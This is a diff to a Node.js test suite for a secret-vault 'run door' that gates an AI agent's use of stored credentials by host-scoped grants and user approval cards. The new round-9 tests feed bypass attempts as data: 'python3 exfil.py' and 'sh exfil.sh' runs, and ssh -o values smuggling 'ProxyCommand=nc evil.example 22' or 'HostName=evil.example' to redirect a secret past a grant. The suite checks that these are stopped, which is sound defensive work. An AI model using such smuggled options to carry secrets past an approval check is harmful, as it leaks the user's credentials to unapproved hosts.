@@ -135,7 +135,7 @@ console.log('② THE VERDICT — membership is the model\'s; hosts and the end a
 // every run without a standing approval draws its card), the paste door, a fake `curl` in a read-only folder ──
 const BIN = path.join(ROOT, 'bin');
 fs.mkdirSync(BIN, { recursive: true });
-for (const t of ['curl', 'aws', 'wget', 'gcloud']) fs.writeFileSync(path.join(BIN, t), `#!/usr/bin/env node\nprocess.stdout.write('${t} got ' + process.env.T + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });   // round 3: `aws` too, for the tool-scoped-wildcard leg (㉑)
+for (const t of ['curl', 'aws', 'wget', 'gcloud', 'ssh', 'scp', 'python3', 'sh', 'mytool', 'make']) fs.writeFileSync(path.join(BIN, t), `#!/usr/bin/env node\nprocess.stdout.write('${t} got ' + process.env.T + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });   // round 3: `aws` for the tool-scoped-wildcard leg (㉑); round 9: ssh/scp (the strdelim -o door leg ㉝) and the shell / interpreter / unknown / make shapes (the paste-grant shape.always leg ㉜)
 fs.chmodSync(BIN, 0o555);   // read-only: the door's programWritable is false (an «Always» / a grant is possible)
 process.on('exit', () => { try { fs.chmodSync(BIN, 0o755); fs.rmSync(ROOT, { recursive: true, force: true }); } catch { } });
 const VALUE = ['unifi', 'admin', 'value', crypto.randomBytes(6).toString('hex')].join('-');
@@ -327,7 +327,7 @@ console.log('⑦ THE REQUEST DEFAULT — the conversation that asked × the host
   const sn = w.vault.secretNames().find((x) => x.name === an.entry);
   ok(sn && sn.hosts.join() === '192.168.1.1' && sn.askedBy.conv === 'cid-asker-1' && sn.askedBy.name === 'Home network', 'the entry records the hosts and who asked (words — never a value)', sn);
   const rc = w.stash.filter((x) => x.cid === 'cid-asker-1').pop();
-  ok(rc && /STORED/.test(rc.text) && /use it in a command toward 192\.168\.1\.1 for 8 hours/.test(rc.text) && /a command to another host still shows the user its card/.test(rc.text) && !rc.text.includes(VALUE), 'the agent\'s receipt says it may use it toward the named host for 8 hours (a command elsewhere still cards)', rc && rc.text);
+  ok(rc && /STORED/.test(rc.text) && /use it in a command toward 192\.168\.1\.1 for 8 hours/.test(rc.text) && /a command to another host.*still shows the user its card/.test(rc.text) && /a new kind of command whose destination cannot be read/.test(rc.text) && !rc.text.includes(VALUE), 'the agent\'s receipt says it may use it toward the named host for 8 hours (a command elsewhere, or a new kind of command, still cards — r9)', rc && rc.text);
   const runIn = await runAnswered(w, CURL(`vault://secrets/${an.entry}/secret`, 'https://192.168.1.1/api/auth/login'));
   ok(runIn.r.ok && runIn.r.by === 'grant' && !runIn.card, '… round 7: the HOST-SCOPED 8-hour grant makes the entry runnable TOWARD the named host — a run to 192.168.1.1 runs by:grant with NO card (vs entry_not_runnable with no grant)', { by: runIn.r.by, code: runIn.r.code, card: !!runIn.card });
   const runOut = await runAnswered(w, CURL(`vault://secrets/${an.entry}/secret`, 'https://10.0.0.9/collect'), { answer: 'always', reauthed: true, ttl: '30d' });
@@ -396,6 +396,12 @@ console.log('⑩ CONTROLS — patched copies, each RED on its leg');
   const DSRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
   const cut = "if (!verdict.ok && verdict.ask && !refused && spec.refs.length && spec.refs.every((r) => (standing.get(r.id) || {}).ok === true && memberUsable(d, r.id, (standing.get(r.id) || {}).id))) {";
   ok(DSRC.split(cut).length === 2, 'the short-circuit line is there once (the control below patches it)');
+  // round 9 (seam ruling C with vault-agent-own): the GRANT road is judged on `shape.destKnown` (the reader READ every
+  // destination), NOT `shape.always` (whether «always» would be OFFERED) — decoupled so a keyed routing flag whose host is read,
+  // which withholds «always», is still coverable by a grant naming it. Pinned so an edit reverting the gate to shape.always is RED.
+  ok(/destinationKnown: !!shape\.destKnown/.test(DSRC), 'the standing verdictFor passes destinationKnown = shape.destKnown, not shape.always (ruling C)');
+  ok(/shape\.destKnown && !dest\.opaque && dest\.hosts\.length/.test(DSRC), 'the host-scoped paste short-circuit is gated on shape.destKnown (ruling C)');
+  ok(!/destinationKnown: !!shape\.always/.test(DSRC) && !/verdict\.ask && !refused && shape\.always &&/.test(DSRC), 'no grant-road gate reads shape.always for destination knowledge — the two facts stay decoupled');
   const noShort = M.load('src/server/vault-run-door.js', DSRC.replace(cut, 'if (false) {'), 'noshort');
   const w1 = await world({ doorMod: noShort });
   const e1 = entryOf(w1);
@@ -948,6 +954,113 @@ console.log('㉛ ROUND 6 (MINOR item 6) — a LOCKED read lists members «unveri
   ok(!alw.r.ok && (alw.r.code === 'vault_locked' || !alw.card), '«Always» while the vault is LOCKED ⇒ vault_locked, nothing runs', { code: alw.r.code, card: !!alw.card });
   await w.vault.unlock(PW);
   ok(w.useGrants.rowsOf(e.id)[0] && w.useGrants.rowsOf(e.id)[0].to.length === 1 && !w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).open === false, 'after unlock the member is intact and verified (the locked read changed nothing)', w.useGrants.rowsOf(e.id)[0] && w.useGrants.rowsOf(e.id)[0].to.length);
+}
+
+console.log('㉜ ROUND 9 (BLOCKER item 1) — the host-scoped 8-hour PASTE grant runs by:grant ONLY for a KNOWN tool whose destination is read with certainty (shape.always); a shell / interpreter / unknown tool / make / curl -K draws its card (the secret never rides an unreadable run)');
+{
+  const w = await world({ setting: { 'vault.requestGrantsRequester': true } });
+  const e = entryOf(w);   // a free secret:<id> — the paste grant's kind
+  const c = w.caller('cid-paste-1', 'Router login');
+  const g = w.door.grantPasted({ scope: 'cid-paste-1', ref: e.ref, purpose: 'log in to the router', hosts: ['192.168.1.1'], by: 'user', requestId: 'rq-1' });
+  ok(g.ok && (g.hosts || []).join() === '192.168.1.1', 'grantPasted --host 192.168.1.1 opens the 8-hour host-scoped grant', g);
+  const run = (argv) => runAnswered(w, RUNTOOL(e.ref, ...argv), { answer: 'deny', caller: c });
+  const ctl = await run(['curl', 'https://192.168.1.1/x']);
+  ok(ctl.r.ok && ctl.r.by === 'grant' && !ctl.card, 'CONTROL: a KNOWN tool to the pasted host (shape.always) runs by:grant, no card', { by: ctl.r.by, card: !!ctl.card });
+  const shapes = [
+    ['interpreter', ['python3', 'exfil.py', 'https://192.168.1.1/']],
+    ['shell', ['sh', 'exfil.sh', 'https://192.168.1.1/']],
+    ['unknown-tool', ['mytool', 'https://192.168.1.1/']],
+    ['make', ['make', 'URL=https://192.168.1.1/']],
+    ['config-file', ['curl', '-K', 'cfg', 'https://192.168.1.1/']],
+  ];
+  const leak = [];
+  for (const [kind, argv] of shapes) { const r = await run(argv); if (r.r.ok || r.r.by === 'grant' || !r.card) leak.push(`${kind}:by=${r.r.by || r.r.code},card=${!!r.card}`); }
+  ok(leak.length === 0, 'every command whose destination cannot be READ draws its card — never by:grant with the secret in its env (the r7 regression: all five ran by:grant for 8 h)', { leak });
+}
+
+console.log('㉝ ROUND 9 (BLOCKER item 2) — the door reads an ssh `-o` keyword as OpenSSH strdelim does: a leading `=`, a `"keyword"` pair, a mid-keyword quote no longer hide ProxyCommand / HostName / ProxyJump / ControlPath (a grant for box.example only)');
+{
+  const w = await world();
+  const e = entryOf(w, { label: 'box key' });
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
+  w.useGrants.addMember(e.id, { kind: 'conversation', key: 'cid-asker-1', name: 'H' }, { hosts: ['box.example'] });
+  const run = (argv) => runAnswered(w, RUNTOOL(e.ref, ...argv), { answer: 'deny' });
+  const ctl = await run(['ssh', 'box.example', 'true']);
+  ok(ctl.r.ok && ctl.r.by === 'grant' && !ctl.card, 'CONTROL: plain `ssh box.example` runs by:grant (the grant covers it)', { by: ctl.r.by });
+  const attacks = [
+    ['=ProxyCommand=', ['ssh', '-o', '=ProxyCommand=nc evil.example 22', 'box.example', 'true']],
+    ['"ProxyCommand"<SP>', ['ssh', '-o', '"ProxyCommand" nc evil.example 22', 'box.example', 'true']],
+    ['=HostName=', ['ssh', '-o', '=HostName=evil.example', 'box.example', 'true']],
+    ['"HostName"<SP>', ['ssh', '-o', '"HostName" evil.example', 'box.example', 'true']],
+    ['Host"Name"', ['ssh', '-o', 'Host"Name" evil.example', 'box.example', 'true']],
+    ['=ProxyJump= alias', ['ssh', '-o', '=ProxyJump=router', 'box.example', 'true']],
+  ];
+  const leak = [];
+  for (const [n, argv] of attacks) { const r = await run(argv); if (r.r.ok || r.r.by === 'grant' || !r.card) leak.push(`${n}:by=${r.r.by || r.r.code},card=${!!r.card}`); }
+  ok(leak.length === 0, 'every quoted / leading-= `-o` spelling of a host or local-command option draws its card — never by:grant to a host the grant does not name', { leak });
+}
+
+console.log('㉞ ROUND 9 (MAJOR item 3) — «Always» is ALL-OR-NOTHING: a refused second entry narrows a WIDENED existing member back (not only an added one revoked) and the switch restore is PUSHED to the window');
+{
+  const w = await world();
+  const whys = []; const occ = w.vault.contentsChanged; w.vault.contentsChanged = (y) => { whys.push(y); return occ ? occ.call(w.vault, y) : undefined; };
+  const e1 = entryOf(w, { label: 'E1' }), e2 = entryOf(w, { label: 'E2' });
+  const A = w.caller('cid-A', 'A');
+  w.door.setRunnable({ id: e1.id, on: true, reauthed: true });
+  w.useGrants.addMember(e1.id, { kind: 'conversation', key: 'cid-A', name: 'A' }, { hosts: ['a.example'] });
+  const h16 = Array.from({ length: 16 }, (_, i) => `h${i}.example`);
+  ok(w.useGrants.addMember(e2.id, { kind: 'conversation', key: 'cid-A', name: 'A' }, { hosts: h16 }).ok, 'E2 member seeded at the 16-host cap');
+  w.door.request({ caller: A, entry: e2.ref, purpose: 'x' });
+  const gi = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-grant-ask');
+  ok(gi && w.door.answerRequest(gi.action.askId, { answer: '8h', reauthed: true }).ok, 'A holds an 8-hour grant on E2 (so the two-entry run draws a card)');
+  const hostsOf = (E) => (((w.useGrants.publicFor(E.id) || {}).to || []).find((m) => m.key === 'cid-A') || {}).hosts;
+  whys.length = 0;
+  const x = await runAnswered(w, ['--env', `T1=${e1.ref}`, '--env', `T2=${e2.ref}`, '--', 'curl', 'https://b.example/x'], { answer: 'always', reauthed: true, ttl: '30d', caller: A });
+  ok(x.a && !x.a.ok && x.a.code === 'too_many_hosts', 'the two-entry «Always» toward b.example is refused (too_many_hosts at E2)', x.a);
+  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, 'vault-run.json'), 'utf8'));
+  ok((hostsOf(e1) || []).join() === 'a.example', 'E1\'s member is NARROWED BACK to [a.example] — the refused «Always» left no widening (r7 kept it ⇒ by:grant to b.example)', { e1: hostsOf(e1) });
+  ok(!st.runnable.includes(e2.id) && whys.includes('switch'), 'E2 is OFF on disk and the restore PUSHED a `switch` to the window (r7\'s bare save told no window)', { e2on: st.runnable.includes(e2.id), whys });
+  const y = await runAnswered(w, ['--env', `T1=${e1.ref}`, '--', 'curl', 'https://b.example/x'], { answer: 'deny', caller: A });
+  ok(!y.r.ok && y.r.by !== 'grant', 'E1 alone to b.example now draws its card (the widening is gone)', { by: y.r.by || y.r.code });
+}
+
+console.log('㉟ ROUND 9 (MAJOR item 4) — a member the OWNER adds through 验证是你 (setRow) while a PRESS holds the entry open is BORN RESUMED: it runs by:grant and the window does NOT say «paused by you»');
+{
+  const w = await world();
+  const e = entryOf(w, { label: 'E' });
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true, keepPaused: true });   // another conversation's «Always» press opens it
+  const s = w.useGrants.setRow(e.id, { to: [{ kind: 'conversation', key: 'cid-B', name: 'B', hosts: ['box.example'] }], except: [] }, { by: 'user', reauthed: true });
+  ok(s.ok, 'the owner Save adds B through 验证是你', s);
+  const fb = ((w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).use || {}).to || []).find((m) => m.key === 'cid-B') || {};
+  ok(!fb.paused, 'the window shows B NOT paused (r7 said «paused by you» for the owner\'s own grant)', { paused: fb.paused });
+  const r = await runAnswered(w, CURL(e.ref, 'https://box.example/x'), { answer: 'deny', caller: w.caller('cid-B', 'B') });
+  ok(r.r.ok && r.r.by === 'grant' && !r.card, 'B runs by:grant, no card (on the base the owner\'s own grant ran; r7 refused it)', { by: r.r.by || r.r.code, card: !!r.card });
+}
+
+console.log('㊱ ROUND 9 (MINOR) — the `opened` / `runnable` cap is ONE bound: an entry past it reloads OFF (fail closed), never ON-with-no-press-marker; a paused member is not silently un-paused by a restart');
+{
+  const w = await world();
+  const target = entryOf(w, { label: 'victim' });   // its name sorts after the fillers below, so the cap drops IT
+  w.door.setRunnable({ id: target.id, on: true, reauthed: true });
+  w.useGrants.addMember(target.id, { kind: 'conversation', key: 'cid-A', name: 'A' }, { hosts: ['box.example'] });
+  w.door.setRunnable({ id: target.id, on: false, reauthed: true });   // A held (OFF)
+  // force the target to sort LAST, then press-open 256 fillers + the target (257 > ENTRY_MAX)
+  const fillers = []; for (let i = 0; i < 256; i++) { const nm = 'secret:0' + i.toString(16).padStart(9, '0'); const r = w.vault.secretPut(nm, VALUE, { prov: 'owner', label: nm, kind: 'password', hosts: [] }); fillers.push(`secrets:${nm}#secret`); }
+  const tnm = 'secret:' + 'f'.repeat(10); const tr = w.vault.secretPut(tnm, VALUE, { prov: 'owner', label: 'z', kind: 'password', hosts: [] });   // sorts last
+  const tgt = { name: tnm, id: `secrets:${tnm}#secret`, ref: `vault://secrets/${tnm}/secret` };
+  w.door.setRunnable({ id: tgt.id, on: true, reauthed: true });
+  w.useGrants.addMember(tgt.id, { kind: 'conversation', key: 'cid-A', name: 'A' }, { hosts: ['box.example'] });
+  w.door.setRunnable({ id: tgt.id, on: false, reauthed: true });
+  for (const id of [...fillers, tgt.id]) w.door.setRunnable({ id, on: true, reauthed: true, keepPaused: true, by: 'user' });
+  const disk = JSON.parse(fs.readFileSync(path.join(w.dataDir, 'vault-run.json'), 'utf8'));
+  ok(disk.runnable.length === 256 && !disk.runnable.includes(tgt.id) && !(disk.opened || {})[tgt.id], 'ONE bound: runnable is capped to 256 and the past-cap entry (sorting last) is in NEITHER runnable nor opened', { runnable: disk.runnable.length, tgtRun: disk.runnable.includes(tgt.id) });
+  const runA = async (E) => (await runAnswered(w, CURL(E.ref, 'https://box.example/x'), { answer: 'deny', caller: w.caller('cid-A', 'A') })).r;
+  const before = await runA(tgt);
+  ok(!before.ok && before.by !== 'grant', 'BEFORE a restart: A is paused on the press-opened target — never by:grant', { by: before.by || before.code });
+  w.vault.lock(); await w.vault.unlock(PW);
+  const d2 = w.mk();   // a fresh door over the same data (a restart)
+  const after = await runAnswered(w, CURL(tgt.ref, 'https://box.example/x'), { answer: 'deny', door: d2, caller: w.caller('cid-A', 'A') });
+  ok(!after.r.ok && after.r.by !== 'grant', 'AFTER lock/unlock + restart: A is STILL refused (fail closed) — the dropped press marker did not un-pause A (r7 reloaded it ON-owner-opened ⇒ by:grant)', { by: after.r.by || after.r.code });
 }
 
 console.log(fail ? `\n${pass} passed, ${fail} failed` : `\nALL PASS (${pass})`);
